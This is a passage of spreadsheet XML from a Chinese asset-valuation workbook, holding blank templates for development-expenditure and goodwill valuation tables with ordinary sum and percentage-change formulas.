      <c r="D23" s="578" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="552" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-G23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(G23=0,"",J23/G23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="552" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-G24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(G24=0,"",J24/G24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B25" s="185" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C25" s="593" t="n"/>
      <c r="D25" s="567" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="555">
        <f>SUM(F6:F24)</f>
        <v/>
      </c>
      <c r="G25" s="555">
        <f>SUM(G6:G24)</f>
        <v/>
      </c>
      <c r="H25" s="552" t="n"/>
      <c r="I25" s="555">
        <f>SUM(I6:I24)</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>I25-G25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(G25=0,"",J25/G25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B26" s="185" t="inlineStr">
        <is>
          <t>减：其他无形资产减值准备</t>
        </is>
      </c>
      <c r="C26" s="593" t="n"/>
      <c r="D26" s="567" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="552" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-G26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(G26=0,"",J26/G26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>合         计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555">
        <f>F25-F26</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>G25-G26</f>
        <v/>
      </c>
      <c r="H27" s="552" t="n"/>
      <c r="I27" s="555">
        <f>I25-I26</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>I27-G27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(G27=0,"",J27/G27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="5">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="B26:D26"/>
    <mergeCell ref="B25:D25"/>
    <mergeCell ref="B1:L1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L5">
    <cfRule type="expression" priority="10" dxfId="3">
      <formula>_xlfn.ISFORMULA(B5)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B25:B27">
    <cfRule type="expression" priority="3" dxfId="3">
      <formula>_xlfn.ISFORMULA(B25)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B6:D24">
    <cfRule type="expression" priority="9" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="E6:L27">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(E6)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0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 codeName="Sheet74">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="13.3333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="12.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="26.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="15.5" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30.75" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="162" t="inlineStr">
        <is>
          <t>开发支出评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="402" t="inlineStr">
        <is>
          <t>表4-14</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="27.75" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>内容或名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期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78" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="555">
        <f>ROUND(SUM(E6:E26),2)</f>
        <v/>
      </c>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="615">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I27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 codeName="Sheet75">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="16" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="1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商誉评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" customFormat="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" customFormat="1" s="116">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="402" t="inlineStr">
        <is>
          <t>表4-15</t>
        </is>
      </c>
    </row>
    <row r="4" customForma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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="27.75" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>内容或名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>取得日期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80" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="J5" s="154" t="n"/>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
      <c r="J6" s="156" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
      <c r="J7" s="156" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
      <c r="J8" s="156" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
      <c r="J9" s="156" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
      <c r="J10" s="156" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
      <c r="J11" s="156" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
      <c r="J12" s="156" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
      <c r="J13" s="156" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
      <c r="J14" s="156" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
      <c r="J15" s="156" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
      <c r="J16" s="156" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
      <c r="J17" s="156" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
      <c r="J18" s="156" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
      <c r="J19" s="156" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
      <c r="J20" s="156" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="116">
